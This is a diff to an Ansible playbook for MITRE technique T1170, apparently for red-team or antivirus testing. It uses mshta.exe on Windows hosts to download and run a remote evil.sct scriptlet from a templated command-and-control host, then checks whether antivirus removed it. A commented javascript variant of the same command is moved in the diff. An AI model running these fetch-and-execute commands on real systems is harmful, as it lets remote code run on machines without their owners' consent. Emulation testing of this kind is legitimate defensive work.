@@ -1,4 +1,5 @@
 #T1170 - Mshta
+# 2nd option mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
 - name: MSHTA - Windows
   hosts: windows
   vars_files:
@@ -7,7 +8,6 @@
     - name: Run mshta.exe to download and execute script (create a new file evil.sct)
       tags: always
       win_shell: |
-# mshta.exe javascript:a=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}").Exec();close();
         mshta vbscript:Close(Execute("GetObject(""{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}"")"))
     - name: sleep for 10 seconds and continue with play to check if AV removed or Not
       tags: always
